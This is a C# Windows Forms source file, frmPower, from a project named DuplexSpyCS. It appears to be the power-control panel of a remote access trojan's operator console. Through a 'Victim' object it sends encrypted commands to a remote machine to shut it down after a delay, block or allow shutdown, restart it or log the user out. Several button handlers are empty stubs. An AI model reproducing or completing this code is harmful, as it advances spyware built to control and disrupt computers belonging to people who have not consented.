using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmPower : Form
    {
        public Victim v;

        public frmPower()
        {
            InitializeComponent();
        }

        private void Send_Shutdown()
        {
            int sec = (int)numericUpDown1.Value;
            v.encSend(2, 0, "power|shutdown|shutdown|" + sec.ToString());
        }
        private void Send_EnableShutdown(bool enable)
        {
            v.encSend(2, 0, "power|shutdown|" + (enable ? "e" : "d"));
        }
        private void Send_Restart()
        {
            v.encSend(2, 0, "power|restart");
        }
        private void Send_Logout()
        {
            v.encSend(2, 0, "power|logout");
        }
        private void Send_Sleep()
        {

        }

        private void frmPower_Load(object sender, EventArgs e)
        {

        }

        //DISABLE ALL
        private void button5_Click(object sender, EventArgs e)
        {

        }

        //SHUTDOWN
        private void button1_Click(object sender, EventArgs e)
        {

        }

        //RESTART
        private void button2_Click(object sender, EventArgs e)
        {

        }

        //LOGOUT
        private void button3_Click(object sender, EventArgs e)
        {

        }

        //SLEEP
        private void button4_Click(object sender, EventArgs e)
        {

        }
    }
}
